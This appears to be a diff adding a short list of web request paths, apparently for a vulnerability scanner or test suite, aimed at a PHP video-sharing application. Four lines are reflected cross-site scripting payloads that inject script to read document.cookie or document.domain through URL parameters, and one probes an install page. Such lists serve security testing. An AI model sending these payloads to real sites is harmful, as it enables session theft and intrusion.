@@ -1,0 +1,5 @@
+/install/index.php
+/index.php?toast=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
+/index.php?success=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
+/index.php?msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E
+/objects/functiongetOpenGraph.php?videoName=123+--><script>alert(document.domain)</script>
